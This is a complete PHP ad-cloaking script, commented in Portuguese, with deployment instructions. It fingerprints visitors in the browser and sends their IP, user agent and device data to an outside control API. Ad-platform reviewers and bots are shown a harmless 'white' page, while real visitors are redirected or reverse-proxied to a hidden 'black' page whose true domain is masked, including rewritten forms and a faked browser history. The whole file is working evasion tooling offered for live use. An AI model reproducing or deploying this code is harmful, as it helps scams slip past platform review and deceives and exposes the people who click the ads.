<?php
/**
 * COMMANDER V11 - Cloaking Profissional
 * Campanha: Teste 1
 * Gerado em: 2026-04-28 12:16:53
 * 
 * NOTA 10 - Sistema multi-camada para Google, TikTok e Facebook
 * 
 * INSTRUCOES:
 * 1. Faca upload deste arquivo (index.php) para a raiz do seu dominio
 * 2. Faca upload do .htaccess junto
 * 3. Configure a URL do anuncio para: https://seudominio.com/?utm_source=...
 * 
 * OPCIONAL (Deteccao Avancada):
 * - Faca upload do arquivo bot-detection-advanced.js para a raiz tambem
 * - Esse arquivo melhora a deteccao de bots headless, mas NAO E OBRIGATORIO
 */

// ==========================================
// CONFIGURACAO V11 - CLOAKING PROFISSIONAL
// ==========================================
$API_URL = 'https://cn.stylecdn.cfd/COMMANDERV2/api.php';
$CAMPAIGN_SLUG = 'teste-1';
$WHITE_URL = 'https://documentoanimal.shop/loja';
$BLACK_URL = 'https://documentoanimal.shop/oficial';
$DEBUG_MODE = isset($_GET['debug']) && $_GET['debug'] === '1';

// ==========================================
// FASE 1: DETECCAO JS (se ainda nao foi feita)
// ==========================================
// Se nao tem os dados de deteccao, mostra pagina de carregamento
// que coleta dados do navegador e reenvia via POST (URL limpa)
if (!isset($_POST['_detected'])) {
    $currentUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') 
                  . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    
    // Pagina de carregamento com deteccao JS - envia via POST
    echo '<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Carregando...</title>
<style>body{margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f5f5f5;font-family:sans-serif}
.loader{text-align:center}.spinner{width:40px;height:40px;border:4px solid #ddd;border-top:4px solid #333;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 10px}
@keyframes spin{to{transform:rotate(360deg)}}</style>
</head><body>
<div class="loader"><div class="spinner"></div><p>Carregando...</p></div>
<form id="f" method="POST" action="' . htmlspecialchars($currentUrl) . '">
<input type="hidden" name="_detected" value="1">
<input type="hidden" name="webdriver" id="wd">
<input type="hidden" name="plugins_count" id="pc">
<input type="hidden" name="languages" id="lg">
<input type="hidden" name="screen_width" id="sw">
<input type="hidden" name="screen_height" id="sh">
<input type="hidden" name="timezone" id="tz">
<input type="hidden" name="touch_support" id="ts">
<input type="hidden" name="platform" id="pf">
<input type="hidden" name="advanced_bot_score" id="abs">
<input type="hidden" name="advanced_bot_flags" id="abf">
</form>
<script src="/bot-detection-advanced.js" onerror=""></script>
<script>
(function(){
    // Envia formulario imediatamente com dados basicos
    // Deteccao avancada eh OPCIONAL - se arquivo nao existir, continua normalmente
    setTimeout(function(){
        var f=document.getElementById("f");
        f.wd.value=navigator.webdriver||window.navigator.webdriver?"1":"0";
        f.pc.value=navigator.plugins?navigator.plugins.length:0;
        f.lg.value=navigator.languages?navigator.languages.join(","):navigator.language||"";
        f.sw.value=screen.width||0;
        f.sh.value=screen.height||0;
        f.tz.value=Intl.DateTimeFormat().resolvedOptions().timeZone||"";
        f.ts.value=("ontouchstart"in window||navigator.maxTouchPoints>0)?"1":"0";
        f.pf.value=navigator.platform||"";
        
        // Deteccao avancada (se disponivel)
        if(window.advancedBotDetection){
            f.abs.value=window.advancedBotDetection.score||50;
            f.abf.value=window.advancedBotDetection.flags?window.advancedBotDetection.flags.join("|"):"";
        }
        f.submit();
    }, 150); // Pequeno delay para JS carregar
})();
</script>
<noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($WHITE_URL) . '"></noscript>
</body></html>';
    exit;
}

// ==========================================
// FASE 2: PROCESSAMENTO COM DADOS DE DETECCAO
// ==========================================

// Coleta dados do visitante
$visitorIP = getVisitorIP();
$visitorUA = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';

// UTMs
$utmSource = $_GET['utm_source'] ?? '';
$utmMedium = $_GET['utm_medium'] ?? '';
$utmCampaign = $_GET['utm_campaign'] ?? '';
$utmContent = $_GET['utm_content'] ?? '';
$utmTerm = $_GET['utm_term'] ?? '';

// Dados adicionais de plataformas
$ttclid = $_GET['ttclid'] ?? '';
$gclid = $_GET['gclid'] ?? '';
$fbclid = $_GET['fbclid'] ?? '';

// Dados de deteccao enviados pelo JS via POST
$webdriver = $_POST['webdriver'] ?? '';
$pluginsCount = $_POST['plugins_count'] ?? -1;
$languages = $_POST['languages'] ?? '';
$screenWidth = $_POST['screen_width'] ?? 0;
$screenHeight = $_POST['screen_height'] ?? 0;
$timezone = $_POST['timezone'] ?? '';
$touchSupport = $_POST['touch_support'] ?? '';
$platform = $_POST['platform'] ?? '';

// Dados de deteccao avancada (score de bot headless)
$advancedBotScore = $_POST['advanced_bot_score'] ?? '';
$advancedBotFlags = $_POST['advanced_bot_flags'] ?? '';

// Envia para API com todos os dados de deteccao
$response = checkWithAPI($API_URL, [
    'action' => 'check',
    'campaign' => $CAMPAIGN_SLUG,
    'ip' => $visitorIP,
    'ua' => $visitorUA,
    'referer' => $referer,
    'utm_source' => $utmSource,
    'utm_medium' => $utmMedium,
    'utm_campaign' => $utmCampaign,
    'utm_content' => $utmContent,
    'utm_term' => $utmTerm,
    'ttclid' => $ttclid,
    'gclid' => $gclid,
    'fbclid' => $fbclid,
    // Dados de deteccao basica
    'webdriver' => $webdriver,
    'plugins_count' => $pluginsCount,
    'languages' => $languages,
    'screen_width' => $screenWidth,
    'screen_height' => $screenHeight,
    'timezone' => $timezone,
    'touch_support' => $touchSupport,
    'platform' => $platform,
    // Dados de deteccao AVANCADA (10 tecnicas)
    'advanced_bot_score' => $advancedBotScore,
    'advanced_bot_flags' => $advancedBotFlags
]);

if ($DEBUG_MODE) {
    echo '<pre>DEBUG Response: '; print_r($response); echo '</pre>';
    exit;
}

// Processa resposta
if ($response && isset($response['action'])) {
    
    // Define URL e método de redirecionamento
    if ($response['action'] === 'black') {
        $targetUrl = $response['redirect'] ?? $response['url'] ?? $BLACK_URL;
        $method = $response['method'] ?? 'redirect'; // redirect, proxy, meta_refresh
    } else {
        $targetUrl = $response['url'] ?? $WHITE_URL;
        $method = $response['white_method'] ?? $response['method'] ?? 'redirect';
    }
    
    // Aplica o metodo de redirecionamento
    switch ($method) {
        case 'proxy':
            // Proxy reverso - serve conteudo mantendo dominio visivel
            proxyRequest($targetUrl);
            break;
            
        case 'meta_refresh':
            // Meta refresh - redirecionamento via HTML
            echo '<!DOCTYPE html><html><head>';
            echo '<meta http-equiv=\"refresh\" content=\"0; url=' . htmlspecialchars($targetUrl) . '\">';
            echo '<script>window.location.href=\"' . htmlspecialchars($targetUrl) . '\";</script>';
            echo '</head><body></body></html>';
            exit;
            
        case 'redirect':
        default:
            // Redirect HTTP 302 (padrao)
            header('Location: ' . $targetUrl);
            exit;
    }
    
} else {
    // Erro na API - vai para white page por seguranca
    header('Location: ' . $WHITE_URL);
    exit;
}

// ============================================
// FUNCOES
// ============================================

function getVisitorIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ips = explode(',', $_SERVER[$header]);
            $ip = trim($ips[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

function checkWithAPI($url, $data) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HTTPHEADER => ['Content-Type: application/x-www-form-urlencoded', 'Accept: application/json']
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

/**
 * Proxy Reverso V3 - URL SEMPRE LIMPA
 * - Reescreve assets (CSS, JS, imagens) para URLs absolutas
 * - Reescreve links <a href> para carregar via proxy (URL limpa)
 * - Formularios tambem passam pelo proxy
 * - Navegacao interna nao muda a URL do navegador
 */
function proxyRequest($targetUrl) {
    // URL atual do proxy (dominio limpo)
    $proxyHost = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
    $proxyScript = $proxyHost . '/index.php';
    
    // Suporta navegacao interna via parametro _nav
    if (isset($_GET['_nav']) && !empty($_GET['_nav'])) {
        $targetUrl = base64_decode($_GET['_nav']);
    }
    
    // Suporta POST (formularios)
    $isPost = $_SERVER['REQUEST_METHOD'] === 'POST';
    $postData = $isPost ? file_get_contents('php://input') : null;
    
    $ch = curl_init($targetUrl);
    $curlOpts = [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0',
        CURLOPT_HTTPHEADER => [
            'X-Forwarded-For: ' . getVisitorIP(),
            'X-Forwarded-Proto: https',
            'Referer: ' . $targetUrl,
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language: pt-BR,pt;q=0.9,en;q=0.8'
        ]
    ];
    
    if ($isPost) {
        $curlOpts[CURLOPT_POST] = true;
        $curlOpts[CURLOPT_POSTFIELDS] = $postData;
        $curlOpts[CURLOPT_HTTPHEADER][] = 'Content-Type: ' . ($_SERVER['CONTENT_TYPE'] ?? 'application/x-www-form-urlencoded');
    }
    
    curl_setopt_array($ch, $curlOpts);
    
    $response = curl_exec($ch);
    $finalUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $contentType = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
    curl_close($ch);
    
    if ($response === false) {
        header('HTTP/1.1 503 Service Unavailable');
        echo 'Erro ao conectar ao servidor remoto';
        exit;
    }
    
    // Se nao for HTML, retorna diretamente (assets)
    if (stripos($contentType, 'text/html') === false && stripos($contentType, 'application/xhtml') === false) {
        header('HTTP/1.1 ' . $httpCode);
        header('Content-Type: ' . $contentType);
        header('Cache-Control: public, max-age=86400');
        echo $response;
        exit;
    }
    
    // Extrai base URL do destino
    $parsed = parse_url($finalUrl);
    $baseUrl = $parsed['scheme'] . '://' . $parsed['host'];
    $basePath = isset($parsed['path']) ? dirname($parsed['path']) : '';
    if ($basePath === '/' || $basePath === '\\' || $basePath === '.') {
        $basePath = '';
    }
    
    // Funcao para converter URL relativa em absoluta
    $makeAbsolute = function($url) use ($baseUrl, $basePath) {
        $url = trim($url);
        if (preg_match('/^https?:\/\//i', $url)) return $url;
        if (preg_match('/^(data:|javascript:|mailto:|tel:|#)/i', $url)) return $url;
        if (strpos($url, '//') === 0) return 'https:' . $url;
        if (strpos($url, '/') === 0) return $baseUrl . $url;
        return $baseUrl . $basePath . '/' . $url;
    };
    
    // Funcao para criar link do proxy (URL limpa)
    $makeProxyLink = function($url) use ($proxyHost, $makeAbsolute) {
        $url = trim($url);
        // Links especiais - nao modificar
        if (preg_match('/^(javascript:|mailto:|tel:|#|data:)/i', $url)) {
            return $url;
        }
        // Converte para absoluta e depois para proxy
        $absolute = $makeAbsolute($url);
        // Retorna link limpo com parametro codificado
        return $proxyHost . '/?_nav=' . base64_encode($absolute);
    };
    
    // =============================================
    // REESCREVE ASSETS PARA URLs ABSOLUTAS
    // =============================================
    
    // 1. CSS: <link href="...">
    $response = preg_replace_callback(
        '/<link([^>]*)href=["\'](.*?)["\'](.*?)>/is',
        function($m) use ($makeAbsolute) {
            return '<link' . $m[1] . 'href="' . $makeAbsolute($m[2]) . '"' . $m[3] . '>';
        },
        $response
    );
    
    // 2. Scripts: <script src="...">
    $response = preg_replace_callback(
        '/<script([^>]*)src=["\'](.*?)["\'](.*?)>/is',
        function($m) use ($makeAbsolute) {
            return '<script' . $m[1] . 'src="' . $makeAbsolute($m[2]) . '"' . $m[3] . '>';
        },
        $response
    );
    
    // 3. Imagens: <img src="...">
    $response = preg_replace_callback(
        '/<img([^>]*)src=["\'](.*?)["\'](.*?)>/is',
        function($m) use ($makeAbsolute) {
            return '<img' . $m[1] . 'src="' . $makeAbsolute($m[2]) . '"' . $m[3] . '>';
        },
        $response
    );
    
    // 4. Videos/Audio: <video src="...">, <source src="...">, <audio src="...">
    $response = preg_replace_callback(
        '/<(video|source|audio)([^>]*)src=["\'](.*?)["\'](.*?)>/is',
        function($m) use ($makeAbsolute) {
            return '<' . $m[1] . $m[2] . 'src="' . $makeAbsolute($m[3]) . '"' . $m[4] . '>';
        },
        $response
    );
    
    // 5. Poster de video
    $response = preg_replace_callback(
        '/poster=["\'](.*?)[\"\']/is',
        function($m) use ($makeAbsolute) {
            return 'poster="' . $makeAbsolute($m[1]) . '"';
        },
        $response
    );
    
    // 6. Background em style: url(...)
    $response = preg_replace_callback(
        '/url\s*\(\s*["\'"]?([^"\'")]+)["\'"]?\s*\)/is',
        function($m) use ($makeAbsolute) {
            $url = trim($m[1]);
            if (preg_match('/^(data:|#)/i', $url)) return $m[0];
            return 'url("' . $makeAbsolute($url) . '")';
        },
        $response
    );
    
    // 7. Srcset
    $response = preg_replace_callback(
        '/srcset=["\'](.*?)[\"\']/is',
        function($m) use ($makeAbsolute) {
            $srcset = $m[1];
            $parts = preg_split('/\s*,\s*/', $srcset);
            $newParts = [];
            foreach ($parts as $part) {
                if (preg_match('/^(.+?)(\s+\d+[wx])?$/i', trim($part), $pm)) {
                    $newParts[] = $makeAbsolute($pm[1]) . ($pm[2] ?? '');
                }
            }
            return 'srcset="' . implode(', ', $newParts) . '"';
        },
        $response
    );
    
    // 8. Data-src, data-bg, etc (lazy loading)
    $response = preg_replace_callback(
        '/data-(?:src|bg|background|lazy-src|original|image)=["\'](.*?)[\"\']/is',
        function($m) use ($makeAbsolute) {
            return 'data-src="' . $makeAbsolute($m[1]) . '"';
        },
        $response
    );
    
    // =============================================
    // REESCREVE LINKS <a href> PARA PROXY (URL LIMPA)
    // =============================================
    $response = preg_replace_callback(
        '/<a([^>]*)href=["\'](.*?)["\'](.*?)>/is',
        function($m) use ($makeProxyLink, $baseUrl) {
            $href = trim($m[2]);
            // Links externos (outros dominios) - abre direto
            if (preg_match('/^https?:\/\//i', $href) && strpos($href, $baseUrl) !== 0) {
                return $m[0]; // Mantem original
            }
            // Links internos - passa pelo proxy
            return '<a' . $m[1] . 'href="' . $makeProxyLink($href) . '"' . $m[3] . '>';
        },
        $response
    );
    
    // =============================================
    // REESCREVE FORMULARIOS PARA PROXY
    // =============================================
    $response = preg_replace_callback(
        '/<form([^>]*)action=["\'](.*?)["\'](.*?)>/is',
        function($m) use ($makeProxyLink) {
            $action = trim($m[2]);
            return '<form' . $m[1] . 'action="' . $makeProxyLink($action) . '"' . $m[3] . '>';
        },
        $response
    );
    
    // =============================================
    // ADICIONA TAG <BASE> PARA RESOLVER RESTANTES
    // =============================================
    $baseTag = '<base href="' . $baseUrl . $basePath . '/">';
    if (stripos($response, '<head') !== false && stripos($response, '<base') === false) {
        $response = preg_replace('/(<head[^>]*>)/i', '$1' . "\n" . $baseTag, $response, 1);
    }
    
    // =============================================
    // SCRIPT PARA INTERCEPTAR NAVEGACAO DINAMICA
    // =============================================
    $proxyScript = '<script>
    (function(){
        var proxyBase = "' . $proxyHost . '/?_nav=";
        var targetBase = "' . $baseUrl . '";
        
        // Intercepta cliques em links que escaparam do regex
        document.addEventListener("click", function(e) {
            var link = e.target.closest("a");
            if (!link) return;
            
            var href = link.getAttribute("href");
            if (!href) return;
            
            // Ignora links especiais
            if (/^(javascript:|mailto:|tel:|#|data:)/i.test(href)) return;
            
            // Ignora links que ja passam pelo proxy
            if (href.indexOf("_nav=") !== -1) return;
            
            // Ignora links externos
            if (/^https?:\/\//i.test(href) && href.indexOf(targetBase) !== 0) return;
            
            // Converte para absoluta se necessario
            var absolute = href;
            if (!/^https?:\/\//i.test(href)) {
                if (href.charAt(0) === "/") {
                    absolute = targetBase + href;
                } else {
                    absolute = targetBase + "/" + href;
                }
            }
            
            // Redireciona via proxy
            e.preventDefault();
            window.location.href = proxyBase + btoa(absolute);
        }, true);
        
        // Intercepta envio de formularios
        document.addEventListener("submit", function(e) {
            var form = e.target;
            var action = form.getAttribute("action") || "";
            
            // Ignora se ja passa pelo proxy
            if (action.indexOf("_nav=") !== -1) return;
            
            // Converte action para proxy
            var absolute = action;
            if (!/^https?:\/\//i.test(action)) {
                if (action.charAt(0) === "/") {
                    absolute = targetBase + action;
                } else {
                    absolute = targetBase + "/" + action;
                }
            }
            
            form.setAttribute("action", proxyBase + btoa(absolute));
        }, true);
        
        // Corrige historico do navegador
        if (window.history && window.history.replaceState) {
            window.history.replaceState({}, document.title, "' . $proxyHost . '/");
        }
    })();
    </script>';
    
    // Injeta script antes de </body>
    if (stripos($response, '</body>') !== false) {
        $response = str_ireplace('</body>', $proxyScript . '</body>', $response);
    } else {
        $response .= $proxyScript;
    }
    
    // =============================================
    // HEADERS
    // =============================================
    header('HTTP/1.1 ' . $httpCode);
    header('Content-Type: text/html; charset=UTF-8');
    header('Cache-Control: no-cache, no-store, must-revalidate');
    header('Access-Control-Allow-Origin: *');
    header_remove('Set-Cookie');
    header_remove('Transfer-Encoding');
    
    echo $response;
    exit;
}
